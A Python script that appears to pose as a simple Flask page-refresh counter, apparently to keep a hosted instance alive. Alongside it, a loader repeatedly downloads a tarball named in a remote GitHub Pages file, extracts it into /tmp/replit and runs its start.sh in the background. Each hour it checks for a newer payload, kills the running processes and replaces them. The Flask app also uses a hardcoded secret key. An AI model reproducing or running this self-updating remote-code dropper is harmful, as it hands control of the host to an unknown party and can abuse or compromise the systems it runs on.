import os
import time
import threading
line = ""
from urllib.request import urlopen
def Webserver():
  from flask import Flask, render_template, session

  app = Flask(__name__)
  app.secret_key = 's3cr3t'
  app.config['SESSION_TYPE'] = 'filesystem'

  @app.route('/')
  def home():
    x = session.get('x', None) 
    if not x:
      session['x'] = 1
    elif x>=10:
      session.clear()
      return "Session Cleared"
    else:
      session['x']+=1
    return "Number of refreshes: "+str(session['x'])
  if __name__ == '__main__':
    app.run(host='0.0.0.0')


x = threading.Thread(target=Webserver)
x.start()

time.sleep(10)
r = urlopen("https://cloudy124.github.io/fantastic-octo-fiesta/ran2.txt")
for line in r:
  line = line.decode('utf-8').strip()
  os.system("rm -rf /tmp/replit")
  os.system("mkdir /tmp/replit")
  os.system("wget https://cloudy124.github.io/fantastic-octo-fiesta/"+line+" -O /tmp/replit/rawr.tar.gz")
  os.system("cd /tmp/replit/ && tar -xf /tmp/replit/rawr.tar.gz && bash start.sh &")
  time.sleep(300)
  os.system("cp /tmp/replit/PID ./")
  with open('ran.txt', 'w') as file:
    file.write(line)

while True:
  
  time.sleep(3600)
  #x = threading.Thread(target=runsmth)
  r = urlopen("https://cloudy124.github.io/fantastic-octo-fiesta/ran2.txt")
  for line in r:
    line = line.decode('utf-8').strip()
    rawr = open("ran2.txt", "r") 
    line2 = rawr.readlines()[0]
    if(line2!=line):
      with open('ran2.txt', 'w') as file:
        file.write(line)

      PID = open("PID", "r") 
      for line3 in PID:
        os.system("kill -9 "+line3)
        os.system("pkill main")
        os.system("rm -rf /tmp/replit")
        os.system("mkdir /tmp/replit")
        os.system("wget https://cloudy124.github.io/fantastic-octo-fiesta/"+line+" -O /tmp/replit/rawr.tar.gz")
        os.system("cd /tmp/replit/ && tar -xf /tmp/replit/rawr.tar.gz && bash start.sh &")
        time.sleep(300)
        os.system("cp /tmp/replit/PID ./")
        


      
      


          
      else:
        woof = True

    
